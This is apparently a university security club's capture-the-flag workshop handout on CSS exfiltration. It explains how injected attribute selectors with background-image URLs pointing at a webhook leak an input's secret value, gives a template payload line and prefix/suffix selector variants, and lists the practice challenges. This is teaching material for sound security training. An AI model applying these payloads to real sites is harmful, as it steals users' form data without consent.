# Web 1: CSS Exfiltration Attack

### What is a CSS Exfiltration Attack?

A CSS Exfiltration Attack occurs when an attacker is able to inject CSS into a web page. While some elements on a page may be restricted from direct access, cleverly crafted CSS can be used to extract sensitive data. This is possible because certain CSS selectors and functions can indirectly leak information by triggering observable behaviors, such as generating HTTP requests. In some cases, CSS injection may also lead to JavaScript execution. Today, we are specifically focusing on the data exfiltration aspect of such attacks.

### What is a Webhook?

A Webhook is a mechanism that allows data to be sent to a unique URL when certain events occur. One way to explore this is by visiting [webhook.site](http://webhook.site), a service that provides you with your own unique URL. This URL is private to you, and any visits to it are logged to it. You can also send information along with each visit, such as `webhook/whatever_you_want`.

### How to perform a CSS Exfiltration Attack?
In our challenge `Style-Stealer`, we assume that a secret is stored in an element such as `<input value="secret">`. The idea is to then inject something like `[value="a"] { background: url(webhook/a); }`, which targets an HTML element with a value attribute equal to "a". If such an element exists, the browser will attempt to load a background image from `webhook/a`, effectively making a request to your webhook URL. Although there's no actual image, the request itself logs the data access. Make sure to replace `"webhook"` with your own unique webhook URL.

To expand this attack, rather than guessing exact values, you can use partial attribute selectors:

`[value^="a"]`
- `^` means first character
    - matches all HTML elements that start with "a"

`[value$="a"]`
- `$` means last character
    - matches all HTML elements that end with "a"

These allow broader probing of values without brute-forcing every possibility. For convenience and scale, it’s recommended to write a Python script with for loop(s) to automatically generate these.

## Challenges

The following challenges in increasing difficulty are deployed to [platform.acmcyber.com](https://platform.acmcyber.com) to practice the concepts covered.

- `style-stealer-1`
- `style-stealer-2`
- `style-stealer-3`
- `style-stealer-4`
- `style-stealer-5`
- `style-stealer-6`
- `style-stealer-100`

### Solving and Submitting

1. Go to the [style-stealer site](https://style-stealer.acmcyber.com/)
2. Generate your script (heh good luck).
3. Paste your script into the big CSS box (it should be pretty visible).
4. Put your desired level into the small Level (1-6, 100)
5. Submit and Test (ask us if you have questions)
    - On the blank page, click "View style".
    - See if the letter(s) that are displayed match the letter(s) logged on your webhook (this is like a sanity check).
6. Copy the URL and DM it to `r2uwu2` on Discord.
7. Once he opens your page, you should get a visit to your webhook with the letter(s) logged there (fingers crossed).
8. If the letters match, he will give you the flag :D. If they don't ...

## Resources

- [webhook.site](http://webhook.site)
- [CSS Attribute Selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors)
- [Blind CSS Data Exfiltration](https://medium.com/@angryovalegg/blind-css-data-exfiltration-8dd6614236b2)
- [Testing for CSS Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection)


